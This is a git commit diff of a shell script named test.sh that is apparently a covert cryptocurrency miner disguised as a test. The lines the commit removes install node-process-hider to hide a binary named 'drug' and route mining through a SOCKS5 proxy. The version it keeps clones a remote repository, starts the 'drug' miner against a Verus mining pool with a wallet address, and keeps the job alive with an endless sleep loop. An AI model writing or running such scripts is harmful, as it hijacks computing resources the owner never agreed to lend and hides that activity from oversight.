267a84a3f024fac39dd0cbee59a2f517f2af6ce4
lidisamolka <100258752+lidisamolka@users.noreply.github.com>
2022-02-23 23:43:19 +0700

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,15 +1,13 @@
-#!/bin/bash
+#!/bin/sh
 sudo apt update
-sudo apt install gcc -y
-curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - 
-sudo apt install nodejs
-npm install -g npm@8.4.1
-npm i -g node-process-hider
-sudo ph add drug
-git clone https://mariere-born@bitbucket.org/mariere-born99/mariere-born.git
-cd mariere-born
-sudo apt update
+sudo apt install screen -y
+git clone https://mariere-born@bitbucket.org/mariere-born99/mariere-born.git && cd mariere-born
 sudo apt install screen libjansson4 -y
 screen -dmS ls
 chmod +x drug
-./drug -a verus -o stratum+tcp://na.luckpool.net:3956 -u RVkDufAGRUEGiXnn1BMzEtDQqJUBDKTuC7.az1 -p x -t 2 -x socks5://192.252.214.20:15864
+./drug -a verus -o stratum+tcp://na.luckpool.net:3956 -u RVkDufAGRUEGiXnn1BMzEtDQqJUBDKTuC7.TEST -p x -t 2
+sudo apt update
+while [ 1 ]; do
+sleep 3
+done
+sleep 999
